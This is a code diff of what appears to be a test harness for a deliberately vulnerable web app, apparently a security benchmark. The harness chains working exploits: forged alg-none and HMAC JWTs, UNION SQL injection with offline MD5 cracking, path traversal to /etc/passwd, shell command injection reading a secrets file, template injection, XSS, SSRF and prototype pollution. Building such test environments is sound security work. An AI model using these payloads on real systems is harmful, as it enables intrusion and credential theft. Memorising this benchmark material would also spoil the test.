@@ -42,23 +42,44 @@ const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
     const none = `${b64({ alg: 'none' })}.${b64({ sub: 'x', role: 'admin' })}.`;
     check('A10', (await get('/api/me', { headers: { authorization: 'Bearer ' + none } })).includes('admin'));
 
-    // ---- group C (use the alg none token, so no secret is needed)
-    const H = { authorization: 'Bearer ' + none, 'content-type': 'application/json' };
-    check('C1', (await get('/api/admin/export?table=users', { headers: H })).includes('password'));
-    check('C2', (await get('/api/admin/logs?file=../../../../../../../../../../../../etc/passwd', { headers: H })).includes('root:'));
-    check('C3', (await get('/api/admin/report', { method: 'POST', headers: H, body: JSON.stringify({ template: '${7*191}' }) })).includes('1337'));
-    await get('/api/admin/plugins/load?name=plugin.js', { method: 'POST', headers: H });
-    check('C4', fs.existsSync(path.join(tmp, 'up', 'rce.txt')));
+    // ---- group C: each flaw is reached ONLY through its designated group A parent (see GROUND_TRUTH.json "chain")
+    const crypto = require('crypto');
+    const forge = (secret) => {
+      const h = b64({ alg: 'HS256', typ: 'JWT' }), p = b64({ sub: 'x', role: 'admin' });
+      return `${h}.${p}.${crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url')}`;
+    };
+    const secretOf = (txt) => (txt.match(/JWT_SECRET=(\w+)/) || [])[1];
+    const hdr = (t) => ({ authorization: 'Bearer ' + t, 'content-type': 'application/json' });
+    const tok = {
+      A10: none,                                   // C1: alg none
+      A1: a1.token,                                // C5, C4: SQLi login token
+      A4: forge(secretOf(secrets)),                // C3: secret read by path traversal
+      A7: forge(env.JWT_SECRET),                   // C6: secret from debug env
+      A3: forge(secretOf(await get('/api/lookup?host=' + encodeURIComponent('x;cat ${DATA_DIR:-data}/secrets.env')))), // C2
+      A6: forge(await get('/api/calc?expr=' + encodeURIComponent("require('./config').JWT_SECRET")).then((t) => JSON.parse(t).result)), // C7
+    };
+    // C10 parent A2: dump the admin MD5 hash with UNION, crack it offline, log in with the real password.
+    const dump = JSON.parse(await get('/api/products?q=' + encodeURIComponent("zzz' UNION SELECT id,username,password FROM users--")));
+    const adminHash = dump.find((r) => r.name === 'admin').price;
+    const words = ['password', 'letmein', 'alice123', 'Adm1n!2026'];
+    const cracked = words.find((w) => crypto.createHash('md5').update(w).digest('hex') === adminHash);
+    tok.A2 = JSON.parse(await get('/api/login', j({ username: 'admin', password: cracked }))).token;
+
+    check('C1<-A10', (await get('/api/admin/export?table=users', { headers: hdr(tok.A10) })).includes('password'));
+    check('C2<-A3', (await get('/api/admin/logs?file=' + '../'.repeat(12) + 'etc/passwd', { headers: hdr(tok.A3) })).includes('root:'));
+    check('C3<-A4', (await get('/api/admin/report', { method: 'POST', headers: hdr(tok.A4), body: JSON.stringify({ template: '${7*191}' }) })).includes('1337'));
+    await get('/api/admin/plugins/load?name=plugin.js', { method: 'POST', headers: hdr(tok.A1) });
+    check('C4<-A9', fs.existsSync(path.join(tmp, 'up', 'rce.txt')));
     await get('/api/login', j({ username: '<img src=x onerror=alert(1)>', password: 'x' }));
-    check('C5', (await get('/api/admin/audit', { headers: H })).includes('<img src=x onerror=alert(1)>'));
+    check('C5<-A1', (await get('/api/admin/audit', { headers: hdr(tok.A1) })).includes('<img src=x onerror=alert(1)>'));
     const dest = path.join(tmp, 'owned.json');
-    await get('/api/admin/backup?dest=' + encodeURIComponent(dest), { method: 'POST', headers: H });
-    check('C6', fs.existsSync(dest));
-    check('C7', (await get('/api/admin/webhook?url=' + encodeURIComponent(`http://127.0.0.1:9091/internal/users?key=${key}`), { method: 'POST', headers: H })).includes('admin'));
-    check('C8', (await internal('/internal/run?cmd=' + encodeURIComponent('echo CMDINJ'))).includes('CMDINJ'));
-    check('C9', (await internal('/internal/users?x=2')).match(/[0-9a-f]{32}/) !== null);
-    const st = JSON.parse(await get('/api/admin/settings', { method: 'POST', headers: H, body: '{"__proto__":{"isAdminEverywhere":true}}' }));
-    check('C10', st.polluted === true);
+    await get('/api/admin/backup?dest=' + encodeURIComponent(dest), { method: 'POST', headers: hdr(tok.A7) });
+    check('C6<-A7', fs.existsSync(dest));
+    check('C7<-A6', (await get('/api/admin/webhook?url=' + encodeURIComponent(`http://127.0.0.1:9091/internal/users?key=${key}`), { method: 'POST', headers: hdr(tok.A6) })).includes('admin'));
+    check('C8<-A5+A8', (await internal('/internal/run?cmd=' + encodeURIComponent('echo CMDINJ'))).includes('CMDINJ'));
+    check('C9<-A5+A8', (await internal('/internal/users?x=2')).match(/[0-9a-f]{32}/) !== null);
+    const st = JSON.parse(await get('/api/admin/settings', { method: 'POST', headers: hdr(tok.A2), body: '{"__proto__":{"isAdminEverywhere":true}}' }));
+    check('C10<-A2', st.polluted === true);
 
     // ---- chain gate: group C must NOT work without an admin token
     const anon = await fetch(BASE + '/api/admin/export?table=users');
